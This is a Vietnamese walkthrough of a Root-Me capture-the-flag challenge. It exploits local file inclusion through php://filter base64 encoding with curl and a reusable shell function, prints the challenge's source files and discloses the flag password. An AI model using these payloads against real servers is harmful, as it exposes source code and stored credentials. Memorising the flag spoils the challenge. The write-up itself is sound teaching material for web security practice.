# PHP - Filters

## Solution

Với gợi ý này, đây là một thử thách khá đơn giản nhưng cũng là một minh họa tuyệt vời về sức mạnh của `php://filter`!

Làm việc trên command line, vì vậy hãy định nghĩa một biến sẽ sử dụng:
`url=http://challenge01.root-me.org//web-serveur/ch12/`

Đang tìm kiếm LFI với `php://filter`, vì vậy hãy thử hiển thị base64 của file `login.php` được sử dụng để xác thực (`?inc=login.php`)

```
$ curl "${url}?inc=php://filter/read=convert.base64-encode/resource=login.php"

 <html>
 <body>
   <h1>FileManager v 0.01</h1>
   <ul>
       <li><a href="?inc=accueil.php">home</a></li>
       <li><a href="?inc=login.php">login</a></li>
   </ul>
PD9waHAKaW5jbHVkZSgiY29uZmlnLnBocCIpOwoKaWYgKCBpc3NldCgkX1BPU1RbInVzZXJuYW1lIl0pICYmIGlzc2V0KCRfUE9TVFsicGFzc3dvcmQiXSkgKXsKICAgIGlmICgkX1BPU1RbInVzZXJuYW1lIl09PSR1c2VybmFtZSAmJiAkX1BPU1RbInBhc3N3b3JkIl09PSRwYXNzd29yZCl7CiAgICAgIHByaW50KCI8aDI+V2VsY29tZSBiYWNrICE8L2gyPiIpOwogICAgICBwcmludCgiVG8gdmFsaWRhdGUgdGhlIGNoYWxsZW5nZSB1c2UgdGhpcyBwYXNzd29yZDxici8+PGJyLz4iKTsKICAgIH0gZWxzZSB7CiAgICAgIHByaW50KCI8aDM+RXJyb3IgOiBubyBzdWNoIHVzZXIvcGFzc3dvcmQ8L2gyPjxiciAvPiIpOwogICAgfQp9IGVsc2Ugewo/PgoKPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CiAgTG9naW4mbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VybmFtZSIgLz48YnIvPjxici8+CiAgUGFzc3dvcmQmbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIC8+PGJyLz48YnIvPgogIDxici8+PGJyLz4KICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY29ubmVjdCIgLz48YnIvPjxici8+CjwvZm9ybT4KCjw/cGhwIH0gPz4=
 </body>
 </html>
```

Bây giờ tất cả những gì phải làm là extract dòng chứa base64 (dòng theo sau `</ul>`) và decode nó:

```
$ curl -s "${url}?inc=php://filter/read=convert.base64-encode/resource=login.php" | sed -n '/<\/ul>/{ n; p; q}' | base64 -d
<?php
include("config.php");
 
if ( isset($_POST["username"]) && isset($_POST["password"]) ){
    if ($_POST["username"]==$username && $_POST["password"]==$password){
      print("<h2>Welcome back !</h2>");
      print("To validate the challenge use this password<br/><br/>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");
    }
} else {
?>
 
<form action="" method="post">
  Login&nbsp;<br/>
  <input type="text" name="username" /><br/><br/>
  Password&nbsp;<br/>
  <input type="password" name="password" /><br/><br/>
  <br/><br/>
  <input type="submit" value="connect" /><br/><br/>
</form>
 
<?php } ?>
```

Vì vậy, từ đây biết mật khẩu đúng cũng là flag cho thử thách này và có thể nó được định nghĩa trong config.php, vì vậy print file này! Vì cần làm điều này cho các file khác, nhanh chóng định nghĩa một hàm shell:

```
$ showfile ()
{
    curl -s "${url}?inc=php://filter/read=convert.base64-encode/resource=$1" | \
        sed -n '/<\/ul>/{ n; p; q}' | base64 -d
}
```

Sử dụng cho `config.php`:

```
$ showfile config.php
<?php
 
$username="admin";
$password="DAPt9D2mky0APAF";
 
?>
```

Bingo! Flag là `DAPt9D2mky0APAF`!

Bây giờ, hãy xem liệu có thể in nội dung của bất kỳ file nào trên máy chủ không:

```
$ showfile index.php
<?php
 
$inc='accueil.php';
if (isset($_GET["inc"])) $inc=$_GET['inc'];
 
include("config.php");
 
 
echo '
 <html>
 <body>
   <h1>FileManager v 0.01</h1>
   <ul>
       <li><a href="?inc=accueil.php">home</a></li>
       <li><a href="?inc=login.php">login</a></li>
   </ul>
';
include($inc);
 
echo '
 </body>
 </html>
';
 
 
?>
```

2 điều:

- có LFI: `include($inc)`

- không có hạn chế rõ ràng nào đối với file có thể include, nhưng nhờ có chỉ thị open_basedir, thực tế có một số hạn chế: không thể include file bên ngoài challenge, hãy xem warning sau khi cố gắng include `../index.php`:

```
curl -s -b "$cookies" "${url}?inc=php://filter/read=convert.base64-encode/resource=../index.php"
...
Warning: include(): open_basedir restriction in effect. File(../index.php) is not within the allowed path(s): (/var/www/challenge01.root-me.org/htdocs/web-serveur/ch12/) in /var/www/challenge01.root-me.org/htdocs/web-serveur/ch12/index.php on line 18
 
 
Warning: include(php://filter/read=convert.base64-encode/resource=../index.php): failed to open stream: operation failed in /var/www/challenge01.root-me.org/htdocs/web-serveur/ch12/index.php on line 18          
 
Warning: include(): Failed opening 'php://filter/read=convert.base64-encode/resource=../index.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/challenge01.root-me.org/htdocs/web-serveur/ch12/index.php on line 18
```